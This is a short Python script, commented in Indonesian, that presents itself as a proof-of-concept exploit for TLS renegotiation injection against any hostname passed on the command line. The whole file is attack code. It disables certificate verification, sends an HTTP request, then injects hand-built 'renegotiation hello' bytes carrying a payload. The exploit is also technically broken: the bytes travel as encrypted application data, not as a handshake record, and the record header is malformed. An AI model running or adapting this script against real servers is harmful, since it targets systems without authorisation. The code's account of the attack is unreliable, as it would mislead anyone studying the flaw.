import socket
import ssl
import time
import sys
import struct


def exploit_renegotiation(hostname, port=443, payload="INJECTION"):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False  # Menonaktifkan pemeriksaan hostname (untuk PoC)
        context.verify_mode = ssl.CERT_NONE  # Menonaktifkan verifikasi sertifikat (untuk PoC)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s_wrapped = context.wrap_socket(s, server_hostname=hostname)
        s_wrapped.connect((hostname, port))

        # Handshake awal
        s_wrapped.do_handshake()

        # Kirim data awal
        data = b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n\r\n"
        s_wrapped.sendall(data)

        # Tunggu respons awal
        while True:
            data = s_wrapped.recv(4096)
            if data:
                break

        # Inject payload selama renegotiation
        reneg_hello = b"\x16\x03\x01\x00" + struct.pack(">H", len(payload) + 5) + b"\x01" + payload.encode()
        s_wrapped.sendall(reneg_hello)

        # Kirim data lanjutan
        data = b"User-Agent: PoC-Renegotiation\r\n\r\n"  # Header tambahan untuk PoC
        s_wrapped.sendall(data)

        # Terima dan cetak respons
        while True:
            data = s_wrapped.recv(4096)
            if data:
                print(data.decode())
            else:
                break

    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

    finally:
        if s_wrapped:
            s_wrapped.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Penggunaan: python3 renegotiation_exploit.py <hostname>")
    else:
        hostname = sys.argv[1]
        exploit_renegotiation(hostname)
